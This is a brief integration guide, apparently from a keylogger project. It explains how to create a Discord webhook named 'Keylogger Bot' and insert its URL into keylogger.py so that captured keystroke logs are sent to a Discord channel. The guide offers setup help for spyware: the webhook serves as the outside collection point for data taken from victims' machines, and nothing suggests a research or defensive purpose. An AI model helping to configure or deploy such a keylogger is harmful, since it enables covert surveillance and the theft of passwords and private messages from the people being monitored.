# Discord Webhook Integration Guide

## Creating Your Webhook

1. **Open Discord** and go to your server
2. **Server Settings** → **Integrations** → **Webhooks**
3. **Create Webhook** button
4. **Configure**:
   - Name: "Keylogger Bot"
   - Channel: Choose where logs go
   - Copy the Webhook URL

## Replacing in Code

Replace the example webhook in `keylogger.py`:

```python
# CHANGE THIS:
WEBHOOK_URL = "your discord url"

# TO YOUR WEBHOOK:
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
